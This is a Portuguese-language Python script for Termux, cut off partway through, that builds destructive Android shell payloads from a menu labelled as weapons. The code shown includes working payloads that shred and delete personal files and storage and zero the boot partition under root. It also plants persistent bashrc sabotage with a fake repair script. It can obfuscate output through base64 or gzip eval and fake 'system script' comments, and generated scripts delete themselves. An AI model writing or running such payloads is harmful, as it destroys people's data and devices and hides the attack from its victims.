#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import zlib
import platform
import hashlib
import json
from typing import Dict, List, Optional

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax

# Realce de código no terminal
import pygments
from pygments.lexers import BashLexer
from pygments.formatters import TerminalFormatter

console = Console()

class GeradorDestrutivoTermux:
    def __init__(self):
        self.payloads = {
            'reformat_celular': {
                'function': self.gerar_reformat_celular,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Reformatação do dispositivo (EXTREMAMENTE PERIGOSO)'
            },
            'sabotagem_termux': {
                'function': self.gerar_sabotagem_termux,
                'category': 'Irritantes',
                'danger_level': 'high',
                'description': 'Sabotagem do Termux com irritações persistentes'
            },
            'apagar_storage': {
                'function': self.gerar_apagar_storage,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Apaga todo o armazenamento interno'
            },
            'bombardeio_notificacoes': {
                'function': self.gerar_bombardeio_notificacoes,
                'category': 'Irritantes',
                'danger_level': 'medium',
                'description': 'Spam de notificações incessantes'
            },
            'troll_completo': {
                'function': self.gerar_troll_completo,
                'category': 'Combo',
                'danger_level': 'critical',
                'description': 'Combo completo de destruição + irritação'
            },
            'negar_servico': {
                'function': self.gerar_negar_servico,
                'category': 'Irritantes',
                'danger_level': 'high',
                'description': 'Consome todos os recursos do sistema'
            },
            'criptografar_dados': {
                'function': self.gerar_criptografar_dados,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Criptografa dados pessoais (ransomware-like)'
            }
        }
        
        self.tecnicas_ofuscacao = {
            'base64': 'Codificação Base64',
            'gzip': 'Compressão GZIP',
            'string_reverse': 'Inversão de Strings',
            'variable_obfuscation': 'Ofuscação de Variáveis',
            'comment_spam': 'Comentários Aleatórios',
            'function_split': 'Divisão em Múltiplas Funções'
        }
        
        self.banners = [
            self._gerar_banner_skull(),
            self._gerar_banner_warning(),
            self._gerar_banner_nuke()
        ]
        
    def _gerar_banner_skull(self) -> str:
        return """
[bold red]
    ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
   ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
   ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
   ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
   ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌
   ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
   ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
   ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
   ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
   ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
    ▀            ▀         ▀  ▀         ▀  ▀         ▀ 
[/bold red]
[bold white on red]    GERADOR DE SCRIPTS DESTRUTIVOS TERMUX - USE COM CUIDADO![/bold white on red]
"""
    
    def _gerar_banner_warning(self) -> str:
        return """
[bold yellow]
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  ██╗    ██╗ █████╗ ██████╗ ██╗███╗   ██╗ ██████╗            ║
║  ██║    ██║██╔══██╗██╔══██╗██║████╗  ██║██╔════╝            ║
║  ██║ █╗ ██║███████║██████╔╝██║██╔██╗ ██║██║  ███╗           ║
║  ██║███╗██║██╔══██║██╔══██╗██║██║╚██╗██║██║   ██║           ║
║  ╚███╔███╔╝██║  ██║██║  ██║██║██║ ╚████║╚██████╔╝           ║
║   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝            ║
║                                                              ║
║  ██████╗ ██╗   ██╗███████╗    ███████╗██████╗ ███████╗██╗   ║
║  ██╔══██╗██║   ██║██╔════╝    ██╔════╝██╔══██╗██╔════╝██║   ║
║  ██████╔╝██║   ██║█████╗      █████╗  ██████╔╝█████╗  ██║   ║
║  ██╔═══╝ ██║   ██║██╔══╝      ██╔══╝  ██╔══██╗██╔══╝  ██║   ║
║  ██║     ╚██████╔╝███████╗    ███████╗██║  ██║███████╗██████╗║
║  ╚═╝      ╚═════╝ ╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
[/bold yellow]
"""
    
    def _gerar_banner_nuke(self) -> str:
        return """
[bold red]
                         ____
                 __,-~~/~    `---.
               _/_,---(      ,    )
           __ /        <    /   )  \___
- ------===;;;'====------------------===;;;===----- -  -
              \/  ~"~"~"~"~"~\~"~)~"/
              (_ (   \  (     >    \)
               \_( _ <         >_>'
                  ~ `-i' ::>|--"
                      I;|.|.|
                     <|i::|i|`.
                    (` ^'"`-' ")
---------------------------------------------------------
[/bold red]
[bold white on red]        DESTRUIÇÃO NUCLEAR PARA TERMUX - DANOS IRREVERSÍVEIS![/bold white on red]
"""
    
    def mostrar_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]☠️  PERIGO EXTREMO! DANOS PERMANENTES NO DISPOSITIVO! ☠️[/blink bold red]\n"
            "⚠️  ESTES SCRIPTS PODEM: \n"
            "   • APAGAR TODOS OS SEUS DADOS\n"
            "   • DANIFICAR PERMANENTEMENTE SEU CELULAR\n"
            "   • DEIXAR SEU TERMUX INUTILIZÁVEL\n"
            "⚠️  USE APENAS PARA TESTES EM AMBIENTES CONTROLADOS!",
            style="red on black"
        ))
        time.sleep(2)
        
        # Confirmação extra de segurança
        if not Confirm.ask("[blink red]⚡ VOCÊ REALMENTE ENTENDE OS RISCOS?[/blink red]", default=False):
            console.print("[green]Saindo com segurança...[/green]")
            sys.exit(0)
    
    def mostrar_menu_principal(self):
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]💀 MENU DE DESTRUIÇÃO TERMUX[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Categoria", style="green")
            tabela.add_column("Perigo", style="red")
            tabela.add_column("Descrição")
            
            opcoes = [
                ("1", "Destrutivos", "💀 CRÍTICO", "Reformatação e exclusão de dados"),
                ("2", "Irritantes", "🔥 ALTO", "Sabotagem e irritação persistente"),
                ("3", "Combo", "☠️ NUCLEAR", "Destruição completa + irritação"),
                ("0", "Configurações", "⚙️", "Opções de ofuscação"),
                ("9", "Sair", "🚪", "Sair do programa")
            ]
            
            for opcao, categoria, perigo, descricao in opcoes:
                tabela.add_row(opcao, categoria, perigo, descricao)
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione sua arma",
                choices=["0", "1", "2", "3", "9"],
                show_choices=False
            )
            
            if escolha == "1":
                self._mostrar_submenu('Destrutivos')
            elif escolha == "2":
                self._mostrar_submenu('Irritantes')
            elif escolha == "3":
                self._mostrar_submenu('Combo')
            elif escolha == "0":
                self._mostrar_menu_configuracao()
            elif escolha == "9":
                self._sair()
    
    def _mostrar_submenu(self, categoria: str):
        payloads_categoria = {k: v for k, v in self.payloads.items() if v['category'] == categoria}
        
        while True:
            console.clear()
            
            if categoria == 'Destrutivos':
                titulo = f"[blink bold red]☠️ {categoria.upper()} ☠️[/blink bold red]"
                estilo = "red"
            elif categoria == 'Irritantes':
                titulo = f"[blink bold yellow]🔥 {categoria.upper()} 🔥[/blink bold yellow]"
                estilo = "yellow"
            else:
                titulo = f"[blink bold white on red]💣 {categoria.upper()} 💣[/blink bold white on red]"
                estilo = "red on white"
            
            tabela = Table(
                title=titulo,
                show_header=True,
                header_style=f"bold {estilo}"
            )
            tabela.add_column("ID", style="cyan", width=5)
            tabela.add_column("Nome", style="green")
            tabela.add_column("Descrição")
            tabela.add_column("Perigo", style="red")
            
            for i, (nome, dados) in enumerate(payloads_categoria.items(), 1):
                icone_perigo = {
                    'medium': '⚠️',
                    'high': '🔥',
                    'critical': '💀'
                }.get(dados['danger_level'], '')
                tabela.add_row(
                    str(i),
                    nome,
                    dados['description'],
                    f"{icone_perigo} {dados['danger_level'].upper()}"
                )
            
            tabela.add_row("0", "Voltar", "Retornar ao menu principal", "↩️")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione o payload",
                choices=[str(i) for i in range(0, len(payloads_categoria)+1)],
                show_choices=False
            )
            
            if escolha == "0":
                return
            
            nome_payload = list(payloads_categoria.keys())[int(escolha)-1]
            self._processar_payload(nome_payload)
    
    def _processar_payload(self, nome_payload: str):
        payload_data = self.payloads[nome_payload]
        
        # Avisos extras para payloads críticos
        if payload_data['danger_level'] in ['high', 'critical']:
            console.print(Panel.fit(
                "[blink bold red]☠️  ALERTA MÁXIMO DE PERIGO! ☠️[/blink bold red]\n"
                "Este script pode:\n"
                "• Causar danos permanentes no dispositivo\n"
                "• Apagar todos os seus dados irreversivelmente\n"
                "• Deixar seu Termux/celular inutilizável\n"
                "• Requer formatação completa para remover",
                border_style="red"
            ))
            
            # Confirmação tripla para payloads críticos
            confirmacoes = 0
            for i in range(3):
                if Confirm.ask(f"[red]Confirmação {i+1}/3 - TEM CERTEZA ABSOLUTA?[/red]", default=False):
                    confirmacoes += 1
                else:
                    break
            
            if confirmacoes < 3:
                console.print("[yellow]Cancelado por segurança...[/yellow]")
                time.sleep(2)
                return
        
        config = self._configurar_payload(nome_payload)
        if config is None:
            return
        
        ofuscar = Confirm.ask("Aplicar técnicas avançadas de ofuscação?")
        tecnicas = []
        if ofuscar:
            tecnicas = self._selecionar_tecnicas_ofuscacao()
        
        with Progress() as progress:
            task = progress.add_task("[red]Gerando payload destrutivo...[/red]", total=100)
            
            payload = payload_data['function'](**config)
            progress.update(task, advance=30)
            
            if ofuscar:
                for tecnica in tecnicas:
                    payload = self._ofuscar_avancado(payload, tecnica)
                    progress.update(task, advance=10)
            
            progress.update(task, completed=100)
        
        self._preview_payload(payload)
        self._salvar_payload(nome_payload, payload)
    
    def _configurar_payload(self, nome_payload: str) -> Optional[Dict]:
        config = {}
        
        if nome_payload == 'reformat_celular':
            console.print(Panel.fit(
                "[bold red]CONFIGURAÇÃO DE REFORMATAÇÃO[/bold red]",
                border_style="red"
            ))
            config['apagar_sdcard'] = Confirm.ask("[yellow]?[/yellow] Apagar também SD Card?", default=False)
            config['sobrescrever'] = Confirm.ask("[yellow]?[/yellow] Sobrescrever com dados aleatórios?", default=True)
        
        elif nome_payload == 'sabotagem_termux':
            console.print(Panel.fit(
                "[bold yellow]CONFIGURAÇÃO DE SABOTAGEM[/bold yellow]",
                border_style="yellow"
            ))
            config['nivel_irritacao'] = IntPrompt.ask(
                "[yellow]?[/yellow] Nível de irritação (1-10)",
                default=7,
                choices=[str(i) for i in range(1, 11)]
            )
            config['persistencia'] = Confirm.ask("[yellow]?[/yellow] Tornar persistente?", default=True)
        
        elif nome_payload == 'troll_completo':
            console.print(Panel.fit(
                "[bold white on red]CONFIGURAÇÃO DO COMBO COMPLETO[/bold white on red]",
                border_style="red"
            ))
            config['incluir_destrutivo'] = Confirm.ask("[yellow]?[/yellow] Incluir destruição?", default=True)
            config['incluir_irritante'] = Confirm.ask("[yellow]?[/yellow] Incluir irritação?", default=True)
            config['delay_inicio'] = IntPrompt.ask("[yellow]?[/yellow] Delay antes de iniciar (minutos)", default=5)
        
        console.print("\n[bold]Resumo da configuração:[/bold]")
        for chave, valor in config.items():
            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
        
        if not Confirm.ask("[red]Confirmar estas configurações?[/red]"):
            return None
        
        return config
    
    def _selecionar_tecnicas_ofuscacao(self) -> List[str]:
        console.print("\n[bold]Técnicas de ofuscação disponíveis:[/bold]")
        tabela = Table(show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan", width=5)
        tabela.add_column("Técnica", style="green")
        tabela.add_column("Dificuldade", style="yellow")
        
        tecnicas_info = {
            'base64': "Fácil",
            'gzip': "Média", 
            'string_reverse': "Fácil",
            'variable_obfuscation': "Difícil",
            'comment_spam': "Fácil",
            'function_split': "Avançada"
        }
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc, tecnicas_info.get(codigo, "Média"))
        
        console.print(tabela)
        
        escolhas = Prompt.ask(
            "[yellow]?[/yellow] Selecione técnicas (separadas por vírgula)",
            default="1,2,4"
        )
        
        return [list(self.tecnicas_ofuscacao.keys())[int(x)-1] for x in escolhas.split(',')]
    
    def _preview_payload(self, payload: str):
        console.print(Panel.fit(
            "[bold yellow]PRÉ-VISUALIZAÇÃO DO PAYLOAD[/bold yellow]",
            border_style="yellow"
        ))
        
        # Mostrar apenas as primeiras linhas para preview
        lines = payload.split('\n')[:20]
        code = '\n'.join(lines)
        
        try:
            lexer = BashLexer()
            formatter = TerminalFormatter()
            highlighted = pygments.highlight(code, lexer, formatter)
            console.print(highlighted)
        except:
            console.print(code)
        
        if len(payload.split('\n')) > 20:
            console.print("[yellow]... (script truncado para preview)[/yellow]")
        
        console.print(f"\n[cyan]Tamanho total: {len(payload)} caracteres, {len(payload.splitlines())} linhas[/cyan]")
    
    def _salvar_payload(self, nome_payload: str, payload: str):
        nome_arquivo = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo de saída",
            default=f"termux_destruct_{nome_payload}.sh"
        )
        
        try:
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                f.write("#!/bin/bash\n")
                f.write("# ⚠️  SCRIPT PERIGOSO - USE COM EXTREMO CUIDADO! ⚠️\n")
                f.write("# Gerado por Termux Destruct Generator\n")
                f.write("# " + "="*60 + "\n\n")
                f.write(payload)
            
            os.chmod(nome_arquivo, 0o755)
            
            # Calcular hashes
            with open(nome_arquivo, 'rb') as f:
                content = f.read()
                md5 = hashlib.md5(content).hexdigest()
                sha256 = hashlib.sha256(content).hexdigest()
            
            console.print(Panel.fit(
                f"[green]✓ Script salvo como [bold]{nome_arquivo}[/bold][/green]\n"
                f"[cyan]MD5: [bold]{md5}[/bold][/cyan]\n"
                f"[cyan]SHA256: [bold]{sha256}[/bold][/cyan]\n"
                f"[yellow]Execute com extremo cuidado:[/yellow]\n"
                f"[bold white]bash {nome_arquivo}[/bold white]",
                title="[bold green]SCRIPT GERADO[/bold green]",
                border_style="green"
            ))
            
            # Aviso final
            console.print(Panel.fit(
                "[blink bold red]⚠️  AVISO FINAL! ⚠️[/blink bold red]\n"
                "Este script pode causar danos irreversíveis!\n"
                "Execute apenas em ambientes de teste controlados!",
                border_style="red"
            ))
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro ao salvar: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def _mostrar_menu_configuracao(self):
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]⚙️ CONFIGURAÇÕES DE OFUSCAÇÃO[/bold cyan]",
                border_style="cyan"
            ))
            
            tabela = Table(show_header=False)
            tabela.add_row("1", "Testar técnicas de ofuscação")
            tabela.add_row("2", "Visualizar payloads sample")
            tabela.add_row("0", "Voltar")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=["0", "1", "2"],
                show_choices=False
            )
            
            if escolha == "1":
                self._testar_ofuscacao()
            elif escolha == "2":
                self._visualizar_payloads_sample()
            elif escolha == "0":
                return
    
    def _testar_ofuscacao(self):
        console.clear()
        codigo_teste = "echo 'Teste de ofuscação'; sleep 1"
        
        console.print(Panel.fit(
            "[bold]TESTE DE TÉCNICAS DE OFUSCAÇÃO[/bold]",
            border_style="yellow"
        ))
        
        tabela = Table(title="Técnicas Disponíveis", show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan")
        tabela.add_column("Técnica")
        tabela.add_column("Exemplo")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            exemplo = self._ofuscar_avancado(codigo_teste, codigo)
            tabela.add_row(str(i), desc, exemplo[:50] + "..." if len(exemplo) > 50 else exemplo)
        
        console.print(tabela)
        
        input("\nPressione Enter para voltar...")
    
    def _visualizar_payloads_sample(self):
        console.clear()
        console.print(Panel.fit(
            "[bold]AMOSTRAS DE PAYLOADS[/bold]",
            border_style="blue"
        ))
        
        # Amostra de cada tipo de payload
        samples = {
            'Destrutivos': self.gerar_reformat_celular(apagar_sdcard=False, sobrescrever=True),
            'Irritantes': self.gerar_sabotagem_termux(nivel_irritacao=5, persistencia=True),
            'Combo': self.gerar_troll_completo(incluir_destrutivo=True, incluir_irritante=True, delay_inicio=2)
        }
        
        for categoria, sample in samples.items():
            console.print(Panel.fit(
                f"[bold]{categoria}[/bold]\n" + "\n".join(sample.split('\n')[:10]),
                border_style="yellow"
            ))
            console.print()
        
        input("\nPressione Enter para voltar...")
    
    def _ofuscar_avancado(self, payload: str, tecnica: str) -> str:
        if tecnica == 'base64':
            encoded = base64.b64encode(payload.encode()).decode()
            return f"eval \"$(echo '{encoded}' | base64 -d)\""
        
        elif tecnica == 'gzip':
            compressed = zlib.compress(payload.encode())
            b64_encoded = base64.b64encode(compressed).decode()
            return f"eval \"$(echo '{b64_encoded}' | base64 -d | zcat)\""
        
        elif tecnica == 'string_reverse':
            reversed_payload = payload[::-1]
            return f"eval \"$(rev <<< '{reversed_payload}')\""
        
        elif tecnica == 'variable_obfuscation':
            parts = payload.split('\n')
            obfuscated = []
            var_names = [f"_{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6))}" for _ in range(10)]
            
            for part in parts:
                if part.strip() and not part.strip().startswith('#'):
                    var_name = random.choice(var_names)
                    obfuscated.append(f"{var_name}=\"{part}\"")
                    var_names.remove(var_name)
            
            obfuscated.append(f"eval \"${{{'; $'.join(var_names)}}}\"")
            return '\n'.join(obfuscated)
        
        elif tecnica == 'comment_spam':
            comments = [
                "# This is a normal system script",
                "# Generated by system utilities",
                "# DO NOT MODIFY - System Generated",
                "# Copyright System Utilities 2023",
                "# License: GPL v3",
                "# Auto-generated script",
                "# System maintenance script"
            ]
            lines = payload.split('\n')
            for i in range(0, len(lines), random.randint(1, 3)):
                if i < len(lines) and lines[i].strip() and not lines[i].startswith('#'):
                    lines.insert(i, random.choice(comments))
            return '\n'.join(lines)
        
        elif tecnica == 'function_split':
            # Divide o payload em múltiplas funções
            lines = payload.split('\n')
            functions = []
            current_func = []
            func_name = f"func_{random.randint(1000, 9999)}"
            
            for line in lines:
                if line.strip() and not line.startswith('#'):
                    current_func.append(f"    {line}")
                    if random.random() < 0.3:  # 30% de chance de quebrar função
                        functions.append(f"{func_name}() {{\n" + "\n".join(current_func) + "\n}")
                        func_name = f"func_{random.randint(1000, 9999)}"
                        current_func = []
            
            if current_func:
                functions.append(f"{func_name}() {{\n" + "\n".join(current_func) + "\n}")
            
            # Adiciona chamadas às funções
            func_calls = [f"{name}()" for name in [f"func_{random.randint(1000, 9999)}" for _ in range(len(functions))]]
            functions.append("\n".join(func_calls))
            
            return "\n\n".join(functions)
        
        return payload

    # =========================================================================
    # IMPLEMENTAÇÕES DOS PAYLOADS DESTRUTIVOS
    # =========================================================================

    def gerar_reformat_celular(self, apagar_sdcard: bool = False, sobrescrever: bool = True, **kwargs) -> str:
        payload = f"""#!/bin/bash
# ⚠️  REFORMATAÇÃO COMPLETA DO DISPOSITIVO ⚠️
# 💀 ESTE SCRIPT APAGARÁ TUDO NO SEU CELULAR 💀

echo "[bold red]INICIANDO REFORMATAÇÃO...[/bold red]"
sleep 3

# Função para destruição segura
destruir_dados() {{
    local arquivo="$1"
    if [ -f "$arquivo" ] || [ -d "$arquivo" ]; then
        echo "Destruindo: $arquivo"
        if [ "{sobrescrever}" = "true" ]; then
            # Sobrescrever com dados aleatórios antes de apagar
            dd if=/dev/urandom of="$arquivo" bs=1M count=10 2>/dev/null
        fi
        rm -rf "$arquivo"
    fi
}}

# Apagar diretórios críticos
echo "💀 APAGANDO DADOS DO USUÁRIO..."
for dir in /data/data/com.termux/files/home /sdcard /storage/emulated/0; do
    if [ -d "$dir" ]; then
        find "$dir" -type f -exec shred -u -z -n 3 {{}} \\;
        rm -rf "$dir"/*
    fi
done

# Apagar SD Card se solicitado
if [ "{apagar_sdcard}" = "true" ]; then
    echo "💀 APAGANDO SD CARD..."
    for sd_dir in /storage/* /mnt/*; do
        if [ -d "$sd_dir" ] && [ "$sd_dir" != "/storage/emulated" ]; then
            find "$sd_dir" -type f -exec shred -u -z -n 3 {{}} \\;
            rm -rf "$sd_dir"/*
        fi
    done
fi

# Danificar sistema Termux
echo "💀 CORROMPENDO TERMUX..."
termux_dir="/data/data/com.termux"
if [ -d "$termux_dir" ]; then
    # Corromper executáveis
    find "$termux_dir" -type f -executable -exec bash -c 'echo "corrupted" > {{}}' \\;
    
    # Apagar bibliotecas
    find "$termux_dir" -name "*.so" -exec rm -f {{}} \\;
    
    # Corromper configurações
    find "$termux_dir" -name "*cfg" -o -name "*conf" -exec bash -c 'echo "broken" > {{}}' \\;
fi

# Tentativa de danificar sistema Android (requer root)
echo "💀 TENTANDO DANIFICAR SISTEMA (requer root)..."
if [ "$(whoami)" = "root" ]; then
    # Sistemas de arquivos para tentar corromper
    for fs in /system /vendor /product /system_ext; do
        if [ -d "$fs" ]; then
            find "$fs" -name "*.apk" -o -name "*.jar" -exec rm -f {{}} \\;
        fi
    done
    
    # Apagar dados de aplicativos
    rm -rf /data/data/*
    
    # Corromper bootloader (extremamente perigoso)
    dd if=/dev/zero of=/dev/block/bootdevice/by-name/boot bs=1M count=1 2>/dev/null
fi

# Mensagem final de destruição
echo " "
echo "[bold white on red]💀 REFORMATAÇÃO COMPLETA! SEU DISPOSITIVO PODE ESTAR INUTILIZÁVEL! 💀[/bold white on red]"
echo "[bold red]Tudo foi apagado. Reinicie o dispositivo para ver os danos completos.[/bold red]"

# Auto-destruição do script
rm -f "$0"

exit 0
"""
        return payload

    def gerar_sabotagem_termux(self, nivel_irritacao: int = 7, persistencia: bool = True, **kwargs) -> str:
        irritacao_level = max(1, min(10, nivel_irritacao))
        payload = f"""#!/bin/bash
# 🔥 SABOTAGEM DO TERMUX - NÍVEL {irritacao_level}/10 🔥
# 😠 Este script tornará seu Termux extremamente irritante! 😠

echo "[yellow]Iniciando sabotagem do Termux...[/yellow]"
sleep 2

# Funções de irritação
irritacao_baixa() {{
    # Alterar prompt constantemente
    echo 'export PS1="\\[\\e[31m\\]💀 \\[\\e[33m\\]\\u@\\h\\[\\e[0m\\]:\\[\\e[32m\\]\\w\\[\\e[0m\\]\\$ "' >> ~/.bashrc
    
    # Aliases irritantes
    echo 'alias ls="echo \\"Não use ls!\\"; ls --color=always"' >> ~/.bashrc
    echo 'alias cd="echo \\"Mudando diretório...\\"; cd"' >> ~/.bashrc
}}

irritacao_media() {{
    # Comandos que falham aleatoriamente
    echo 'function command_fail() {{ [ $((RANDOM % 3)) -eq 0 ] && return 1 || return 0; }}' >> ~/.bashrc
    echo 'alias ls="command_fail && ls || echo \\"Comando falhou!\\""' >> ~/.bashrc
    
    # Delay aleatório nos comandos
    echo 'function random_delay() {{ sleep 0.$((RANDOM % 5)); }}' >> ~/.bashrc
    echo 'alias _="random_delay && "' >> ~/.bashrc
}}

irritacao_alta() {{
    # Mensagens aleatórias
    messages=(
        "Por que você ainda está usando isso?"
        "Seu Termux está comprometido!"
        "Haha, isso é irritante, não é?"
        "Tente me remover, se for capaz!"
        "🤖 Estou te observando..."
    )
    
    echo 'function random_message() {{' >> ~/.bashrc
    echo '  messages=(' >> ~/.bashrc
    for msg in "${{messages[@]}}"; do
        echo "    \"{msg}\"" >> ~/.bashrc
    done
    echo '  )' >> ~/.bashrc
    echo '  echo "${{messages[$((RANDOM % ${{#messages[@]}}))]}}"' >> ~/.bashrc
    echo '}' >> ~/.bashrc
    echo 'random_message' >> ~/.bashrc
    
    # Teclas trocadas aleatoriamente
    echo 'function swap_keys() {' >> ~/.bashrc
    echo '  case $((RANDOM % 10)) in' >> ~/.bashrc
    echo '    0) export INPUTCHARS="aoeui";;' >> ~/.bashrc
    echo '    1) export INPUTCHARS="sdfgh";;' >> ~/.bashrc
    echo '    *) export INPUTCHARS="";;' >> ~/.bashrc
    echo '  esac' >> ~/.bashrc
    echo '}' >> ~/.bashrc
}}

irritacao_extrema() {{
    # Redirecionamento de comandos
    echo 'function sabotage_commands() {{' >> ~/.bashrc
    echo '  case $1 in' >> ~/.bashrc
    echo '    ls) shift; /system/bin/ls "$@";;' >> ~/.bashrc
    echo '    cd) echo "Não pode mudar de diretório!";;' >> ~/.bashrc
    echo '    rm) echo "Não apague nada!";;' >> ~/.bashrc
    echo '    *) command "$@";;' >> ~/.bashrc
    echo '  esac' >> ~/.bashrc
    echo '}' >> ~/.bashrc
    echo 'alias command=sabotage_commands' >> ~/.bashrc
    
    # Terminal piscante
    echo 'echo -e "\\e[5m"' >> ~/.bashrc
}}

# Aplicar níveis de irritação
if [ {irritacao_level} -ge 4 ]; then
    irritacao_baixa
fi

if [ {irritacao_level} -ge 6 ]; then
    irritacao_media
fi

if [ {irritacao_level} -ge 8 ]; then
    irritacao_alta
fi

if [ {irritacao_level} -ge 9 ]; then
    irritacao_extrema
fi

# Persistência avançada
if [ "{persistencia}" = "true" ]; then
    echo "[yellow]Instalando persistência...[/yellow]"
    
    # Múltiplos métodos de persistência
    echo 'source ~/.bashrc' >> ~/.bash_profile
    echo 'source ~/.bashrc' >> ~/.profile
    
    # Arquivo oculto que recria a sabotagem
    cat > ~/.termux_fix << 'EOF'
#!/bin/bash
# Este "script de reparo" na verdade piora a situação
echo "Reparando Termux..."
sleep 2
echo "Oops, piorando tudo!"
cat ~/.bashrc_sabotage >> ~/.bashrc
EOF
    
    chmod +x ~/.termux_fix
fi

# Criar arquivo de restauração difícil
cat > RESTAURAR_TERMUX.txt << 'EOF'
PARA REMOVER A SABOTAGEM:

1. Execute: rm -f ~/.bashrc ~/.bash_profile ~/.profile
2. Reinstale o Termux completamente
3. Restaure seus dados de backup (se tiver)

⚠️  Pode ser necessário desinstalar e reinstalar o Termux!
EOF

echo " "
echo "[bold yellow]🔥 SABOTAGEM COMPLETA! Seu Termux agora está irritante! 🔥[/bold yellow]"
echo "[yellow]Verifique o arquivo RESTAURAR_TERMUX.txt para instruções de remoção.[/yellow]"

# Esconder evidências
sleep 3
clear

exit 0
"""
        return payload

    def gerar_apagar_storage(self, **kwargs) -> str:
        return """#!/bin/bash
# 💀 DESTRUIÇÃO DO ARMAZENAMENTO INTERNO 💀
# ⚠️  Este script apagará TUDO no armazenamento interno!

echo "[bold red]INICIANDO DESTRUIÇÃO DO ARMAZENAMENTO...[/bold red]"
sleep 3

# Função de destruição segura com verificação
destruir_arquivos() {
    local diretorio="$1"
    local padrao="$2"
    
    if [ -d "$diretorio" ]; then
        echo "💀 Destruindo: $diretorio/$padrao"
        find "$diretorio" -name "$padrao" -type f -exec shred -u -z -n 5 {} \\;
        find "$diretorio" -name "$padrao" -type d -exec rm -rf {} \\;
    fi
}

# Diretórios críticos para destruir
diretorios_mortais=(
    "/sdcard"
    "/storage/emulated/0"
    "/data/data/com.termux/files/home"
    "/storage/self/primary"
)

# Padrões de arquivos para target
padroes_destruicao=(
    "*.jpg" "*.png" "*.mp4" "*.mp3" "*.pdf" "*.doc*" "*.xls*"
    "*.txt" "*.json" "*.xml" "*.db" "*.sqlite" "*.zip" "*.rar"
)

echo "💀 COMEÇANDO A DESTRUIÇÃO EM MASSA..."
for dir in "${diretorios_mortais[@]}"; do
    for padrao in "${padroes_destruicao[@]}"; do
        destruir_arquivos "$dir" "$padrao"
    done
    # Apagar diretórios vazios também
    find "$dir" -type d -empty -delete 2>/dev/null
done

# Destruição adicional para Android
if [ -d "/data" ]; then
    echo "💀 DESTRUINDO DADOS DE APLICATIVOS..."
    find /data -name "*.db" -o -name "*.cache" -exec shred -u {} \\;
fi

# Sobrescrever espaço livre para dificultar recuperação
echo "💀 SOBRESCREVENDO ESPAÇO LIVRE..."
dd if=/dev/urandom of=/sdcard/junk.dat bs=1M count=100 2>/dev/null
rm -f /sdcard/junk.dat

echo " "
echo "[bold white on red]💀 DESTRUIÇÃO COMPLETA! SEUS DADOS FORAM APAGADOS! 💀[/bold white on red]"
echo "[red]Todos os arquivos pessoais foram destruídos irreversivelmente.[/red]"

# Auto-destruição
rm -f "$0"

exit 0
"""

    def gerar_bombardeio_notificacoes(self, **kwargs) -> str:
        return """#!/bin/bash
# 🔔 BOMBARDEIO DE NOTIFICAÇÕES 🔔
# 📱 Este script enviará notificações incessantes!

echo "[yellow]Preparando bombardeio de notificações...[/yellow]"

# Verificar se termux-api está instalado
if ! command -v termux-notification &> /dev/null; then
    echo "[red]Termux-API não instalado! Instale com: pkg install termux-api[/red]"
    exit 1
fi

# Função de notificação irritante
notificar() {
    local titulo="$1"
    local conteudo="$2"
